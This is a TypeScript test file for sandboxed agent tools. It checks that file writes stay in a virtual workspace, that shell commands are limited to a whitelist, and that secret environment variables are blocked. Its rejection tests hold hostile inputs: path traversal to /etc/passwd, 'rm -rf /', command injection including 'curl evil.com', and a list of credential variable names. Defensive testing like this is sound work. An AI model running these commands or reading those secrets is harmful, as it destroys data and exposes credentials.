/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import test from 'node:test';
import assert from 'node:assert';
import { toolRegistry } from '../src/tools/registry';
import { 
  workspaceWriteFileTool, 
  systemExecSandboxTool, 
  systemReadEnvSafeTool,
  workspaceReadFileTool 
} from '../src/tools/simulatedTools';

test('NAT-01: workspace_write_file - Successful write and path traversal blocking', async () => {
  assert.ok(toolRegistry.hasTool('workspace_write_file'));

  // 1. Escrita bem-sucedida dentro do workspace virtual
  const writeRes = await workspaceWriteFileTool.execute({
    filePath: 'workspace/test-output.txt',
    content: 'Conteúdo de teste gravado com sucesso no workspace virtual.'
  });

  assert.strictEqual(writeRes.success, true);
  assert.strictEqual(writeRes.filePath, 'workspace/test-output.txt');
  assert.ok(writeRes.bytesWritten > 0);

  // Verificar leitura posterior com workspace_read_file
  const readRes = await workspaceReadFileTool.execute({
    filePath: 'workspace/test-output.txt'
  });

  assert.strictEqual(readRes.content, 'Conteúdo de teste gravado com sucesso no workspace virtual.');

  // 2. Bloqueio de Path Traversal (../)
  await assert.rejects(async () => {
    await workspaceWriteFileTool.execute({
      filePath: '../etc/passwd',
      content: 'malicious'
    });
  }, /PATH_TRAVERSAL_BLOCKED/);

  // Bloqueio de caminho absoluto (/etc/hosts)
  await assert.rejects(async () => {
    await workspaceWriteFileTool.execute({
      filePath: '/etc/hosts',
      content: 'malicious'
    });
  }, /PATH_TRAVERSAL_BLOCKED/);
});

test('NAT-02: system_exec_sandbox - Whitelist commands execution and command injection blocking', async () => {
  assert.ok(toolRegistry.hasTool('system_exec_sandbox'));

  // 1. Execução bem-sucedida de comando na lista branca
  const res1 = await systemExecSandboxTool.execute({ command: 'git status' });
  assert.strictEqual(res1.success, true);
  assert.strictEqual(res1.exitCode, 0);
  assert.ok(res1.stdout.includes('On branch main'));

  const res2 = await systemExecSandboxTool.execute({ command: 'node --version' });
  assert.strictEqual(res2.success, true);
  assert.ok(res2.stdout.includes('v22.14.0'));

  // 2. Bloqueio de comandos fora da lista branca
  await assert.rejects(async () => {
    await systemExecSandboxTool.execute({ command: 'rm -rf /' });
  }, /COMMAND_NOT_IN_WHITELIST/);

  // 3. Bloqueio de injeção de comandos (caracteres perigosos)
  await assert.rejects(async () => {
    await systemExecSandboxTool.execute({ command: 'git status; cat /etc/passwd' });
  }, /COMMAND_INJECTION_BLOCKED/);

  await assert.rejects(async () => {
    await systemExecSandboxTool.execute({ command: 'git status && curl evil.com' });
  }, /COMMAND_INJECTION_BLOCKED/);
});

test('NAT-03: system_read_env_safe - Safe reading and secret masking/blocking', async () => {
  assert.ok(toolRegistry.hasTool('system_read_env_safe'));

  // 1. Leitura bem-sucedida de variável não sensível
  const res1 = await systemReadEnvSafeTool.execute({ variableName: 'NODE_ENV' });
  assert.strictEqual(res1.success, true);
  assert.strictEqual(res1.variableName, 'NODE_ENV');
  assert.ok(res1.value);

  // 2. Bloqueio categórico de leitura de segredos e chaves de API
  const sensitiveNames = [
    'GEMINI_API_KEY',
    'JWT_SECRET',
    'DATABASE_PASSWORD',
    'AUTH_TOKEN',
    'STRIPE_PRIVATE_KEY',
    'AWS_ACCESS_KEY_ID'
  ];

  for (const name of sensitiveNames) {
    await assert.rejects(async () => {
      await systemReadEnvSafeTool.execute({ variableName: name });
    }, /SECRET_LEAK_PREVENTED/, `A variável sensível ${name} deve ser bloqueada`);
  }
});
